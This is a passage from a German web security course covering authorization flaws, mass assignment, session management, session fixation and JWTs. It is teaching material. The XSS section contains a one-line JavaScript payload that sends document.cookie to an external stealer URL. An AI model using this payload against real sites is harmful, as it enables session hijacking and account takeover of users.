jeweiligen Operation.</p> <p>Bei einer fehlerhaften Authorization muss ein Angreifer sich zumindest authentifizieren. Im Fehlerfall kann der Betreiben den Login- und Registrierungsprozess unterbinden, alle Benutzer ausloggen und erh\u00e4lt auf diese Weise eine Plattform, auf die ein trusted User wieder zulassen kann um dadurch einen eingeschr\u00e4nkten Betrieb zu erm\u00f6glichen (w\u00e4hrend der grundlegende Fehler behoben wird). Im Gegensatz dazu, muss bei einer fehlenden Authentication die Plattform deaktiviert werden, da diese M\u00f6glichkeit zur Einschr\u00e4nkung auf vertrauensw\u00fcrdige Benutzer entf\u00e4llt.</p>"},{"location":"authentication-and-authorization/authorization/#probleme-bei-der-berechtigungsuberprufung","title":"Probleme bei der Berechtigungs\u00fcberpr\u00fcfung","text":"<p>In diesem Kapitel wird auf mehrere Probleme im Zusammenhang mit Bereichtungs\u00fcberpr\u00fcfungen eingegangen.</p>"},{"location":"authentication-and-authorization/authorization/#keinefehlende-authorization","title":"Keine/Fehlende Authorization","text":"<p>Die Applikation \u00fcberpr\u00fcft zwar die Authentication aber jeder eingeloggte Benutzer darf alle Operationen aufrufen.</p> <p>Da ein Benutzer sich initial authentifizieren muss, kann aufgrund des Logverlaufs der Fehler zumindest analysiert und der b\u00f6sartige User ausgesperrt werden. Eine Gef\u00e4hrdung durch Crawler findet ebenso nicht statt, da diese keine valide Authentication durchf\u00fchren k\u00f6nnen.</p> <p>Analog zu den Fehlern bei der Authentication, kann es zu Problemen kommen wenn eine Applikation innerhalb mehrere Programmiersprachen/Frameworks implementiert wurde bzw. weitere Komponenten zu einer bestehenden L\u00f6sung hinzugef\u00fcgt wurden. Hauptproblem ist die Integration der Authorization in das Bestandssystem. Als Pen-Tester sollte man immer diese Komponenten gezielt auf Authentication- und Authorization-Fehler hin testen.</p> <p>There is a special place in hell for developers that think that not-displaying UI elements is a kind of authorization. H\u00e4ufig werden in Abh\u00e4ngigkeit der Benutzerrolle nur Teile der Funktionalit\u00e4t angezeigt. Ein Angreifer der einen zweiten Benutzeraccount mit diesen Rechten (oder Log-Dateien) besitzt, erh\u00e4lt allerdings Informationen \u00fcber die Operationen und kann diese direkt aufrufen. Dies ist ein Fall von Security by Obscurity.</p> <p>Das erzwungene Aufrufen von Webseiten \u00fcber URLs wird auch Forceful Browsing genannt. Wird direkt auf Ressourcen, wie z. b. Downloadlinks, zugegriffen, wird dies direct object reference genannt.</p>"},{"location":"authentication-and-authorization/authorization/#unterschiedliche-authorization-in-alternate-channels","title":"Unterschiedliche Authorization in Alternate Channels","text":"<p>Falls eine Webapplikation Daten oder Operationen auf unterschiedliche Arten und Weisen anbietet, m\u00fcssen die Schutzmechanismen auf den verschiedenen Kan\u00e4len synchronisiert werden.</p> <p>Wird z.B. eine Operation direkt mittels der Webseite als auch \u00fcber eine SOAP Webservice-Schnittstelle (z.B. f\u00fcr eine mobile Applikation) angeboten, m\u00fcssen auf beiden Schnittstellen die gleichen Zugriffsberechtigungen \u00fcberpr\u00fcft werden. H\u00e4ufig kann man w\u00e4hrend Penetration-Tests verminderte Schutzma\u00dfnahmen bei Webservice-Schnittstellen feststellen.</p>"},{"location":"authentication-and-authorization/authorization/#probleme-bei-verwendung-von-websockets","title":"Probleme bei Verwendung von WebSockets","text":"<p>WebSockets unterliegen nicht der Same-Origin-Policy moderner Webbrowser. Es wird daher empfohlen, bei \u00f6ffnen des WebSockets serverseitig den Origin-Header auf valide aufrufende Webseiten hin zu \u00fcberpr\u00fcfen. W\u00e4hrend des initialen Handshakes wird ein Web-Socket-Key \u00fcbertragen. Dieser dient nur zur Identifikation des Browsers gegen\u00fcber dem Webserver und darf nicht zu Authentications- bzw. Authorization-Zwecken verwendet werden.</p> <p>\u00dcber WebSockets werden zumeist Nachrichten verschickt. Der Server wird auf den Erhalt einer Nachricht hin eine Operation starten, vor dieser muss der Server eine Berechtigungs\u00fcberpr\u00fcfung durchf\u00fchren. Die Berechtigungen zwischen WebSockets und HTTP-basierte Kommunikation m\u00fcssen auf jeden Fall synchron gehalten werden (siehe auch, Different Authorization in Alternate Channels). Ein h\u00e4ufiges Problem ist, dass der Client vor der Authentication des WebBrowsers gegen\u00fcber dem Client bereits einen WebSocket \u00f6ffnet. In diesem Fall wird meistens eine parallele Session-Verwaltung auf server-seite aufgebaut: innerhalb einer Serverdatenbank wird f\u00fcr den WebSocket-Client eine Session-Id oder eine Token-Id generiert, in der Datenbank der betreffende Web-Benutzer dem Token zugeordnet und dem Client das token/die session mitgeteilt. Der Webbrowser muss nun bei jeder WebSocket Anfrage dieses Secret mit \u00fcbertragen und der Server kann den User \u00fcber dieses Token identifizieren.</p>"},{"location":"authentication-and-authorization/authorization/#hint-update-operationen","title":"Hint: Update Operationen","text":"<p>Anhand eines Beispiels soll gezeigt werden, warum auch einfache Operationen komplexe Sicherheitsfragen aufwerfen k\u00f6nnen. Bei dem konkreten Beispiel sollen Benutzerdaten aktualisiert werden. Hierf\u00fcr wird folgende Update-Operation aufgerufen:</p> <pre><code>POST /user/update/1 HTTP/1.1\n</code></pre> <p>Als Parameter wird ein JSON-String mit den neuen Werten \u00fcbergeben:</p> <pre><code>{\n    \"id\" : \"1\",\n    \"name\" : \"happe\"\n}\n</code></pre> <p>Bei diesem Beispiel fallen folgende sicherheitsrelevanten Fragen an:</p> <ul> <li> <p>kann ich durch Setzen einer anderen ID (statt 1) in der URL auf   einen anderen Datensatz schreibend zugreifen?</p> </li> <li> <p>was passiert, wenn man die ID im Datensatz \u00e4ndert? Teilweise   \u00fcberpr\u00fcfen Webapplikationen nur die ID innerhalb der URL und   ignorieren die IDs innerhalb des Datensatzes. Mit Gl\u00fcck kann man   diesen Missmatch zum \u00dcberschreiben anderer Datens\u00e4tze verwenden.</p> </li> <li> <p>was passiert, wenn im Datensatz keine ID vorkommt und der Angreifer   manuell ein ID-Element in das JSON-Dokument hinzuf\u00fcgt?</p> </li> <li> <p>was passiert, wenn der Angreifer ein neues JSON-Element namens   \u201cAdmin\u201d: \u201ctrue\u201d hinzuf\u00fcgt?</p> </li> <li> <p>was passiert, wenn der Angreifer statt HTTP POST eine HTTP GET   Operation verwendet? HTTP GET sollte eigentlich eine read-only   Operation sein, deswegen werden GET requests teilweise von   Web-Application Firewalls nicht kontrolliert und man kann auf diese   Weise Firewall-Regeln umgehen.</p> </li> </ul>"},{"location":"authentication-and-authorization/authorization/#mass-assignments","title":"Mass-Assignments","text":"<p>Moderne Web-Frameworks versuchen die Effizienz von Programmierern zu verbessern. Ein Feature, welches potentiell negativen Einfluss auf die Sicherheit einer Applikation besitzt ist mass assignments.</p> <p>Unter Mass-Assignment versteht man das automatisierte Zuweisen von Werten aus einem HTTP Request zu einem Datenbank-Objekt. So k\u00f6nnten z.B. bei einem User-Update die \u00fcbergebenen HTTP-Parameter automatisch gegen\u00fcber den bekannten Datenbankfeldern gematched werden und Parameter wie z.B. vorname oder nachname werden automatisch auf das Datenbankfeld vorname und nachname des betroffenen Datensatzes gemapped und aktualisiert.</p> <p>In Ruby on Rails w\u00fcrde der betroffene Code folgenderma\u00dfen aussehen:</p> <pre><code>@user = User.find(params[:id])\n@user.update(params[:user])\n</code></pre> <p>Die erste Zeile des Beispiels verwendet den \u00fcbergebenen id Parameter um aus der Datenbank ein User-Objekt zu laden. In der zweiten Zeile werden nun die vorhandenen HTTP-Parameter automatisch den vorhandenen Feldern des User-Objektes zugewiesen.</p> <p>Dies ist aus Sicherheitssicht problematisch. Ein Angreifer kann versuchen potentielle Datenbankfelder zu erraten und diese mittels mass-assignment zuzuweisen. Beispiele w\u00e4ren z. b. das Setzen von role=admin oder admin=true.</p> <p>Um dies zu verhindern besitzen die meisten Frameworks ein M\u00f6glichkeit Attribute f\u00fcr das Mass-Assignmentexplizit zu verbieten (black-list) oder zu erlauben (white-list). Aus Sicherheitssicht ist das automatische Ablehnen von Attributen und die explizite Freigabe einzelner Attribute (also das White-Listing) vorzuziehen.</p> <p>In Ruby on Rails w\u00fcrde der betroffene Code folgenderma\u00dfen aussehen:</p> <pre><code>@user = User.find(params[:id])\n@user.update(params.require(:user).permit(:full_name))\n</code></pre> <p>In diesem Fall werden nur die Felder full_name f\u00fcr das Objektes user mittels mass-assignment aktualisiert.</p>"},{"location":"authentication-and-authorization/authorization/#scoping-von-daten","title":"Scoping von Daten","text":"<p>Unter Scoping von Daten versteht man das Einschr\u00e4nken der verf\u00fcgbaren Daten auf einen Subbereich. Eine Web-Operation wird meistens f\u00fcr einen Benutzer aufgerufen, die potentiell verf\u00fcgbaren Daten sollten so fr\u00fch wie m\u00f6glich auf die f\u00fcr den Benutzer verf\u00fcgbaren Daten eingeschr\u00e4nkt werden.</p> <p>Beispiel: eine Applikation verwaltet Rechnungen, jede Rechnung hat einen Benutzer als Autor. Mittels einer Update-Operation kann eine Rechnung bearbeitet werden. Dies geschieht mittels der Operation <code>/invoice/1/update</code>, in der Applikation ist der gerade angemeldete autorisierte User als current_user bekannt, mittels current_user.invoices kann man auf die Rechnungen des aktuellen Users zugreifen, mittels Invoice auf alle Rechnungen die dem System bekannt sind.</p> <p>Die Update-Operation sollte nun folgenderma\u00dfen aussehen:</p> <pre><code># hier sollte NICHT Invoice.find(params[:id]) stehen\n@invoice = current_user.invoices.find(params[:id])\n\n# normaler Update-Code\n@invoice.update(the_data_which_will_be_updated)\n@invoice.save\n</code></pre> <p>Durch die Verwendung des User-Scopes wird implizit der Zugriff auf Rechnungen des aktuellen Benutzers erzwungen. Dadurch m\u00fcssen Zugriffsberechtigungen nicht zus\u00e4tzlich explizit kontrolliert werden.</p>"},{"location":"authentication-and-authorization/authorization/#time-of-check-time-of-use-toctou","title":"Time of Check, Time of Use (TOCTOU)","text":"<p>Der Zeitpunkt der Berechtigungs\u00fcberpr\u00fcfung ist essentiell. So genannte Time of Check, Time of Use Angriffe nutzen racing conditions zwischen der \u00dcberpr\u00fcfung von Operationsberechtigungen und der Ausf\u00fchrung von Operationen aus.</p> <p>Ein gutes Beispiel f\u00fcr die TOCTOU-Problematik sind zumeist Token-basierte Systeme. Hier wird die Berechtigung eines Anwenders \u00fcberpr\u00fcft und danach ein Token mit einer definierten Laufzeit ausgestellt. Wird das Token w\u00e4hrend der Laufzeit an eine Operation \u00fcberreicht, wird dieses valide Token als Zugangsberechtigung akzeptiert und die Operation ausgef\u00fchrt auch wenn zwischenzeitlich die Berechtigungen des Benutzer modifiziert wurden und der Benutzer die Operation eigentlich nicht mehr ausf\u00fchren d\u00fcrfe.</p>"},{"location":"authentication-and-authorization/authorization/#reflektionsfragen","title":"Reflektionsfragen","text":"<ol> <li> <p>Erkl\u00e4re den Unterschied zwischen Identifikation, Authentication und    Authorization?</p> </li> <li> <p>Was versteht man unter Authorization? Wann und wo sollte diese    durchgef\u00fchrt werden? Welches Sicherheitsproblem versteht man unter    Insecure Direct Object Reference bzw. unter Forced Browsing?</p> </li> <li> <p>Welche Probleme k\u00f6nnen im Zusammenhang mit Mass-Assignment    auftreten?</p> </li> <li> <p>Gegeben ein Webshop mit einem Downloadlink f\u00fcr Rechnungen    http://shop.local/invoices/1/download. Welche    sicherheitsrelevanten Fehler k\u00f6nnen hier nun auftreten?</p> </li> <li> <p>Gegeben eine Profil-Updatefunktion welche als POST    <code>/user/1/update</code> implementiert wurde, als Parameter werden die Felder id, email,    new_password und rolle (mit Wert user) \u00fcbergeben. Erkl\u00e4re    zumindest drei Sicherheitsprobleme die w\u00e4hrend des Updates eines    Benutzers auftreten k\u00f6nnen.</p> </li> </ol>"},{"location":"authentication-and-authorization/session_management/","title":"Session Management","text":"<p>Eine Session ist eine stehende Verbindung zwischen einem Client und einem Server. Innerhalb der Session kann der Server Zugriffe einem Client zuordnen. Nach erfolgtem Login kennt der Server also die Benutzeridentit\u00e4t des Clients (bis zum erfolgten Logout). Im Web-Umfeld werden zumeist Cookie-basierte Sessions verwendet, andere M\u00f6glichkeiten w\u00e4ren z.B. Token basierte Systeme.</p> <p>Token-basierte Systeme werden gerne zur \u00dcbertragung von Zugangsberechtigungen f\u00fcr REST- oder SOAP-Webservices verwendet. Sofern die Services state-less sind, ist dies eine sehr gute Kombination. In diesem Fall werden alle notwendigen Session-/Benutzerinformationen im Token transportiert, der Service selbst persistiert keine State-Informationen. Durch diese funktionale Herangehensweise kann der Service perfekt horizontal skalieren: wird mehr Performance ben\u00f6tigt, werden weitere Service-Worker gestartet. Dies ist h\u00e4ufig bei Webservices die durch Mobilapplikationen konsumiert werden der Fall, allerdings seltener bei interaktiven Webapplikationen. Bei letzteren wird der Token h\u00e4ufig als Session-Identifikatior missbraucht und dient zur Identifikation einer serverseitigen Session \u2014 der Service ist also state-ful. Um ein vollwertiges Session-System zu erlangen m\u00fcssen Programmierer nun dieses, basierend auf dem Token als Identifier, selbst programmieren und erfinden daher quasi das Rad neu. Die Verwendung von Token erbringt keine Vorteile mehr und sollte in diesem Fall diskutiert werden. Ein h\u00e4ufiger Grund diesen Nachteil in Kauf zu nehmen ist, dass zumindest Web- und Mobilapplikationen die idente serverseitige API konsumieren k\u00f6nnen.</p>"},{"location":"authentication-and-authorization/session_management/#client-vs-server-side-session","title":"Client- vs Server-Side Session","text":"<p>Mit Hilfe des Cookies kann der Server nun ein Session-Management Schema implementieren. Prinzipiell gibt es nun die Unterscheidung in client- und server-seitigem Session-Schemas.</p> <p>Bei der client-seitigen Variante speichert der Server alle f\u00fcr die Authentication relevanten Daten direkt im Cookie und versendet dieses an den Client. Am Server selbst wird keine Session-Information gespeichert. Bei jedem Folgezugriff inkludiert der Client dieses Cookie, der Server interpretiert diese Daten und bildet anhand dieser die Benutzersession. Bei diesem Verfahren sind mehrere Punkte problematisch:</p> <ul> <li> <p>Der Client kann das Cookie beliebig ver\u00e4ndern. Dadurch k\u00f6nnte z.B.   ein im Cookie gespeicherter Benutzername auf \u201cadmin\u201d ge\u00e4ndert   werden. Der Server kann dies umgehen, indem er das Cookie signiert   und dadurch dessen Integrit\u00e4t sichert.</p> </li> <li> <p>Der Client kann das Cookie auslesen, und dadurch Zugriff auf   potentiell sensible Daten erhalten. Der Server kann dies umgehen,   indem er das Cookie verschl\u00fcsselt und dadurch die Confidentiality   der Daten gew\u00e4hrleistet.</p> </li> <li> <p>Der Server besitzt keine M\u00f6glichkeit serverseitig alle Sessions   eines Benutzers zu invalidieren (sprich, alle Session eines   Benutzers auszuloggen).</p> </li> </ul> <p>Bei einer server-seitigen Sessionimplementierung generiert der Server eine eindeutige zuf\u00e4llige ID und speichert diese innerhalb des Cookies. In einer serverseitigen Datenbank wird nun diese ID dem eingeloggten Benutzer zugeordnet und potentiell noch weitere Metainformationen (Zeitpunkt des Logins, IP-Adresse, etc.) gespeichert. Bei dieser L\u00f6sung werden die im Client gespeicherten Daten minimiert und der Server besitzt die M\u00f6glichkeit alle Sessions zu beenden (indem er die Eintr\u00e4ge des Users aus der Session-Tabelle l\u00f6scht).</p> <p>Aus Sicherheitssicht sind server-seitige Sessions zu bevorzugen; einige neuere Standards wie die \u00f6sterreichische \u00d6NORM A77.00 schreiben den Einsatz von server-seitigen Sessions vor.</p>"},{"location":"authentication-and-authorization/session_management/#token-basierte-systeme-fur-interaktive-sessions","title":"Token-basierte Systeme f\u00fcr interaktive Sessions","text":"<p>H\u00e4ufig werden client-seitige Token Systeme als direkte Alternative zu Cookie-Session-basierten Systemen angepriesen. Als Vorteil wird zumeist ihre bessere Skalierbarkeit (wenn nur Token-gespeicherte Daten f\u00fcr eine Operation ben\u00f6tigt werden, wird kein Datenbank-Zugriff ben\u00f6tigt) und Sicherheit (durch die Verwendung von Kryptographie) angepriesen. Diese Begr\u00fcndung macht leider zumeist nur begrenzt Sinn.</p> <p>Bei den meisten Operationen bei denen eine Autorisation \u00fcberpr\u00fcft wird, ben\u00f6tigen eine Form des Datenbankzugriffs da zus\u00e4tzliche Daten zu den, im Token gespeicherten, Daten ben\u00f6tigt werden. Dadurch wird der Skalierbarkeits-Vorteil entkr\u00e4ftet. Zus\u00e4tzlich ist bei jedem Zugriff eine, potentiell teure, kryptographische Operation notwendig. Die Verwendung von Kryptographie innerhalb des Tokens ist orthogonal zu der Gesamtsicherheit der Webapplikation. Eine Cookie-basierte client-seitige L\u00f6sung kann ebenso eine Signatur (bzw. einen MAC[1]) verwenden um die Integrit\u00e4t der Daten zu gew\u00e4hrleisten. Eine server-seitige Cookie-basierte Sessionl\u00f6sung w\u00fcrde diese \u00dcberpr\u00fcfung nicht ben\u00f6tigen, daf\u00fcr allerdings einen kryptographischen Zufallszahlengenerator zur Generierung der Session-Id verwenden.</p> <p>Negativ f\u00fcr die Sicherheit ist das Fehlen einer server-seitigen Session-Komponente. Wie kann eine kompromittierte Session server-seitig invalidiert werden? Die naive L\u00f6sung, den privaten server-seitigen Schl\u00fcssel, der zur Erstellung des MACs/der Signatur des Tokens verwendet wird, zu tauschen ist nicht praktikabel, da dadurch alle aktiven Sessions ung\u00fcltig werden w\u00fcrden. Wird eine server-seitige Blacklist gef\u00fchrt, wird aus dem Token auf einer logischen Ebene eine server-seitige Session: der Entwickler hat nun das Rad neu erfunden und dabei wahrscheinlich neue Bugs eingebaut.</p> <p>Wird eine Kombination von kurzlebigen Access-, und langlebigen Refresh-Tokens verwendet, wird dadurch das verwundbare Zeitfenster nur reduziert und eine Angreifer muss nur das Refresh- statt dem Access-Token entwenden um den selben Effekt zu erreichen. Wird beim Neuausstellen des Access-Tokens mittels des Refresh-Tokens das Token gegen eine Blacklist verglichen, hat der Entwickler wieder quasi server-seitige Sessions neu erfunden.</p> <p>Token-basierte Systeme sind gut daf\u00fcr geeignet, Clients im Auftrag des Users Zugriff auf Operationen und Daten zu erlauben. Dies kann z.B. eine third-party Webseite oder eine Mobilapplikation sein. F\u00fcr interaktive Webseiten sind sie potentiell suboptimal da sich die Entwickler Gedanken um die Revocation ausgestellter Tokens machen m\u00fcssen. Synergie-Gr\u00fcnde (die gleiche API kann von einer Webapplikation als auch von mobilen Applikation verwendet werden) k\u00f6nnen eine Token-basierte L\u00f6sung interessant machen, in diesem Fall m\u00fcssen allerdings die Vor- und Nachteile der selbst-implementierten Revocation abgewogen werden.</p>"},{"location":"authentication-and-authorization/session_management/#viewstate","title":"ViewState","text":"<p>Das ViewState-pattern speichert den aktuellen Status der View (z.B. eingegebene Daten, Verlaufshistorie, aktuell verf\u00fcgbare Operationen) innerhalb des ViewStates, z.B. als hidden Parameter innerhalb jedes Formulars. Da der ViewState am Client gespeichert wird, muss der Server sich um den Integrit\u00e4ts- und Confidentiality-Schutz k\u00fcmmern.</p> <p>Bei jeder Operation wird der ViewState vom Browser dem Server \u00fcbergeben. Dieser \u00fcberpr\u00fcft die Integrit\u00e4t des ViewStates, verifiziert dass der ViewState mit der gew\u00fcnschten Operation kompatibel ist, f\u00fchrt danach die Operation aus und aktualisiert den ViewState. Dieser wird dann innerhalb der n\u00e4chsten Formulare wieder als hidden field eingetragen.</p>"},{"location":"authentication-and-authorization/session_management/#idealer-sessionablauf","title":"Idealer Sessionablauf","text":"<p>Der Soll-Session-Lifecycle w\u00e4re:</p> <ol> <li> <p>Benutzer f\u00fchrt ein Login durch. W\u00e4hrend des erfolgreichem Logins    wird eine neue zuf\u00e4llige Session-Id am Server mittels eines    kryptographisch-sicheren Zufallsgenerator generiert, und dem Client    auf sicherem Weg mitgeteilt.</p> </li> <li> <p>Der eingeloggte Benutzer f\u00fchrt nun mehrere Operationen aus. Der    Browser des Benutzers inkludiert das Session-Cookie bei jedem    Zugriff.</p> </li> <li> <p>Vor dem Zugriff auf sensible Operationen oder Daten wird \u00fcberpr\u00fcft,    ob die Session-Id noch aktiv ist. Der logische Benutzer wird der    Session zugeordnet und die Applikation f\u00fchrt \u00dcberpr\u00fcfung der    Benutzeridentit\u00e4t und -berechtigung durch.</p> </li> <li> <p>W\u00e4hrend des Logouts wird sowohl server-seitig als auch client-seitig    das Session-Cookie gel\u00f6scht und damit die Session auf beiden Seiten    invalidiert.</p> </li> </ol>"},{"location":"authentication-and-authorization/session_management/#potentielle-probleme-beim-session-management","title":"Potentielle Probleme beim Session-Management","text":"<p>W\u00e4hrend der ideale Sessionverlauf relativ einfach aussieht, k\u00f6nnen dabei mehrere sicherheitsrelevante Probleme auftreten:</p>"},{"location":"authentication-and-authorization/session_management/#session-id-wird-verloren","title":"Session-Id wird verloren","text":"<p>Die Session-ID dient als Erkennungsmerkmal eines Benutzers. Wenn ein Angreifer die Session-Id erlangt, kann er die Identit\u00e4t des Benutzers am Server \u00fcbernehmen.</p> <p>Am einfachsten gelingt dies, wenn der Server nicht HTTPS verwendet. In diesem Fall ben\u00f6tigt der Angreifer nur Zugriff auf die Transportdaten (z.B. mittels Sniffing im gleichen WLAN ohne Client-Separation). Der Angreifer kann nun seine Session-Id mit der des Opfers ersetzen und \u00fcbernimmt auf diese Weise dessen Identit\u00e4t.</p> <p>Aus diesem Grund sollten Webseiten nur mehr mittels HTTPS angeboten werden und auch automatisch HTTP Aufrufe auf HTTPS umleiten. Da zumeist Webseiten sowohl \u00fcber HTTP und HTTPS angeboten werden, kann es zu Problemen kommen: z.B. k\u00f6nnte ein unbedarfter Benutzer eine HTTP Adresse in einem Browser eingeben. In diesem Fall \u00fcbermittelt der Browser automatisch bei diesem ungesicherten Request das Session-Cookie. W\u00e4hrend er danach automatisch vom Server auf HTTPS umgeleitet wird, ist dies bereits zu sp\u00e4t da bei dem ersten ungesicherten Request schon das Cookie disclosed wurde.</p> <p>Eine L\u00f6sung f\u00fcr dieses Problem bietet das secure-Flag das bei einem Cookie gesetzt werden kann. Dieses Flag unterrichtet den Webbrowser, dass das Cookie nur mittels HTTPS \u00fcbertragen werden darf. Im Fall einer HTTP Operation wird die Operation durch den Browser ohne Cookie durchgef\u00fchrt. Die Verbindungssicherheit kann ebenso durch die Verwendung des HSTS-Headers bzw. durch Einsatz bestimmter CSP-Direktiven sichergestellt werden.</p>"},{"location":"authentication-and-authorization/session_management/#mixed-content-firesheep","title":"Mixed-Content / FireSheep","text":"<p>Die Verwendung von sowohl HTTP als auch HTTPS innerhalb einer Seite ist ebenso problematisch. Dieses Pattern war um das Jahr 2010/11 stark verbreitet, u.a. von Seiten wie Facebook, Twitter und Flickr. In diesem Fall war nur die Login und Logout Operation mittels HTTPS gesch\u00fctzt, weitere Inhalte wurde mittels HTTP \u00fcbertragen. Die Begr\u00fcndung war, dass sensible Daten (Benutzername und Passwort) verschl\u00fcsselt werden und keine sensiblen Daten in den \u00fcbertragenen Seiten enthalten sind[2]. Hauptgrund daf\u00fcr war gering verf\u00fcgbare Rechenkapazit\u00e4t und die relativ \"teure\" Verschl\u00fcsselung (also schlussendlich Kosten).</p> <p>Dies ist nat\u00fcrlich problematisch, da ein Angreifer mit Zugriff auf die Netzwerkdaten die Session-Id extrahieren und dadurch die serverseitige Identit\u00e4t \u00fcbernehmen kann. Dies wurde eindrucksvoll mittels FireSheep gezeigt: diese Firefox-Erweiterung zeigte in einer SideBar alle erkannten Sessions an, der Anwender konnte durch Click auf die Sidebar die jeweilige Session im Browser aktivieren. Aufgrund der Publicity dieses Tools fingen Seiten schnell an, HTTPS durchg\u00e4ngig zu implementieren. Eine weitere Firefox Erweiterung die in Reaktion darauf erschien war HTTP Everywhere (erzwingt den Einsatz von HTTPS wenn eine Seite sowohl \u00fcber HTTP und HTTPS verf\u00fcgbar ist).</p>"},{"location":"authentication-and-authorization/session_management/#session-id-in-get-parameter","title":"Session-Id in GET-Parameter","text":"<p>Sensible Daten sollten niemals als Teil der URL bzw. \u00fcber HTTP GET Parameter \u00fcbertragen werden. Dies gilt auch f\u00fcr die Session-Id.</p> <p>Welche Probleme k\u00f6nnen bei der Verwendung als GET Parameter auftreten?</p> <ul> <li> <p>Die Session-Id ist Teil der URL und wird mit hoher   Wahrscheinlichkeit in Web-Proxies und Web-Server Logdateien   gespeichert.</p> </li> <li> <p>Die URL inklusive der GET Parameter sind Teil der Browser Historie.   Durch Fehler in Browsern k\u00f6nnen Fremdseiten teilweise auf die   Browserhistorie zugreifen.</p> </li> <li> <p>GET Parameter werden teilweise von Site Analysis Tools verwendet.   Dies w\u00fcrde implizieren, dass z.B. bei Verwendung von Google   Analytics alle Session-IDs an Alphabet weitergeleitet werden.</p> </li> <li> <p>Wird ein Cookie als Teil der URL verwendet, wird dieser Session-Wert   im Normalfall \u00fcber den Referer-Header \u00fcbertragen. Auf diese Weise   w\u00fcrde jede besuchte externe Webseite diesen Session-Wert.</p> </li> </ul> <p>Anstatt des GET-Parameters sollte die Cookie-basierte HTTP Session verwendet werden. Falls dies nicht m\u00f6glich ist, sollte ein HTTP POST statt GET verwendet werden. W\u00e4hrend dies die Gef\u00e4hrdung durch einen b\u00f6sartigen Angreifer nicht minimiert, verringert es das Fehlerrisiko.</p>"},{"location":"authentication-and-authorization/session_management/#session-id-ist-vorher-bestimmbar","title":"Session-Id ist vorher bestimmbar","text":"<p>Eine Session-Id muss eine zuf\u00e4llig generierte Zahl sein, dies impliziert die Verwendung eines kryptographischen Zufallszahlengenerators. Beispiele f\u00fcr schlecht gew\u00e4hlte Session-Ids w\u00e4ren:</p> <ul> <li> <p>Aufsteigende Zahlen</p> </li> <li> <p>Verwenden eines Hashs \u00fcber erratbare Eingangswerte:   hash(Systemzeit), hash(username), hash(username:password).</p> </li> <li> <p>Verwenden eines MACs \u00fcber konstante Daten: mac(username),   mac(username:password)</p> </li> <li> <p>mac(systemzeit) \u2014 mittels NTP Angriffe kann versucht werden, die   Zeit des Servers in die Vergangenheit zu bewegen.</p> </li> <li> <p>Verwendung eines nicht-kryptographisch sicheren   Zufallszahlengenerator (z.B. java.util.Random statt   java.security.SecureRandom in Java).</p> </li> </ul> <p>W\u00e4hrend eines Pen-Tests w\u00fcrde die Zuf\u00e4lligkeit der Session-Id getestet werden. Dies geschieht indem man sich mehrere Tausend Male einloggt und mittels statistischer Methoden die Zuf\u00e4lligkeit und Entropie der Session-Id analysiert.</p>"},{"location":"authentication-and-authorization/session_management/#session-fixation","title":"Session Fixation","text":"<p>Ein weiteres Problem besteht, wenn der Angreifer eine Session-Id dem Clientbrowser vorschreiben kann bzw. eine konstante Session-Id bekannt ist.</p> <p>Letzteres passiert, wenn die Webapplikation beim ersten Zugriff eines Browsers eine Session-Id vergibt und diese w\u00e4hrend des Logins nicht neu setzt. Im einfachsten Fall w\u00fcrde ein Angreifer kurz Zugriff auf den Browser des Opfers erhalten (z.B. durch einen nicht gesperrten PC innerhalb eines B\u00fcros), die Zielwebseite besuchen und den Wert des Session Cookies aufzeichnen. Wenn sich nun (Stunden sp\u00e4ter) das Opfer einloggt, kennt der Angreifer bereits den Wert des Session-Cookies und kann auf diese Weise die Session \u00fcbernehmen.</p> <p>Alternativ: unter der Annahme, dass die Webseite zus\u00e4tzlich eine Operation besitzt bei der das Session-Cookie mittels HTTP GET Parameter \u00fcbergeben wird. In dem Fall kann der Angreifer einen Social Engineering Angriff durchf\u00fchren. Er verschickt Emails mit Links auf die betreffende Operation mit zuf\u00e4llig generierten Session-Ids. Wenn ein Opfer nun auf diese Operation zugreift, erkennt der Webserver, dass das Opfer nicht eingeloggt ist und leitet das Opfer zum Login-Dialog. Das Opfer logt sich ein, der Webserver \u00fcbernimmt die Session-Id. Der Angreifer muss nur periodisch testen, ob mit einer der versendeten Session-Ids ein Login m\u00f6glich ist.</p>"},{"location":"authentication-and-authorization/session_management/#session-extraktion-mittels-xss-lucke","title":"Session-Extraktion mittels XSS-L\u00fccke","text":"<p>Mittels Javascript kann auf Session-Cookies zugegriffen werden. Falls die Webseite eine (der h\u00e4ufigen) XSS-L\u00fccken[3]) besitzt kann ein Angreifer nun Javascript-Code auf der Webseite platzieren, warten bis ein anderer Benutzer darauf zugreift und mittels des Javascript-Codes die Session-Id auf einen externen Server \u00fcbermitteln. Dieser Angriffsvektor macht vor allem Spa\u00df, wenn eine Nachrichtenfunktion innerhalb einer Applikation verwundbar ist, da man dadurch einzelne Benutzer direkt anvisieren kann.</p> <p>Beispiel f\u00fcr ein einfaches Javascript-Fragment welches ein Redirect auf einen externen Server (xyz.com) durchf\u00fchrt und als GET-Parameter die aktuellen Cookies \u00fcbergibt:</p> <pre><code>&lt;script&gt;location.href = 'http://xyz.com/stealer.php?cookie='+document.cookie;\n&lt;/script&gt;\n</code></pre> <p>Folgende Gegenma\u00dfnahmen sollten implementiert werden:</p> <ul> <li> <p>keine XSS-L\u00fccke in der Webseite implementieren\u2026</p> </li> <li> <p>durch Verwendung des httpOnly-Cookie Flags kann dem Webbrowser   mitgeteilt werden, dass der Zugriff mittels Javascript auf das   Session Cookie nicht erlaubt ist.</p> </li> <li> <p>CSP bietet M\u00f6glichkeiten XSS-Angriffe einzuschr\u00e4nken.</p> </li> </ul>"},{"location":"authentication-and-authorization/session_management/#json-web-tokens","title":"JSON Web Tokens","text":"<p>JSON Web Tokens (JWT) sind standardisierte (RFC 7519) Tokens die als HTTP Parameter, HTTP Session Cookies oder mittels eines HTTP Headers \u00fcbertragen werden k\u00f6nnen. Ein JSON Web-Token besteht aus drei Bereichen:</p> <ul> <li> <p>Header: dieser Bereich speichert vor allem den verwendeten   Algorithmus zur Erstellung des Integrity Checks.</p> </li> <li> <p>Content: JSON-Dokument welches die eigentliche Payload des Tokens   ist. Es gib hier mehre vordefinierte optionale Werte: iss   beschreibt den Issuer/Aussteller des Tokens, sub beschreibt das   Subjekt des tokens, aud die geplante Audience (welche Server   sollen das Token erhalten), exp und nbf den G\u00fcltigkeitszeitraum   des tokens, iat den Ausstellungszeitpunkt.</p> </li> <li> <p>Integrity Check: der integrity check verwendet den, im alg-Header   definierten Algorithmus \u00fcber header und content um eine   Checksumme zu bilden.</p> </li> </ul> <p>Die Gesamtstruktur des Tokens 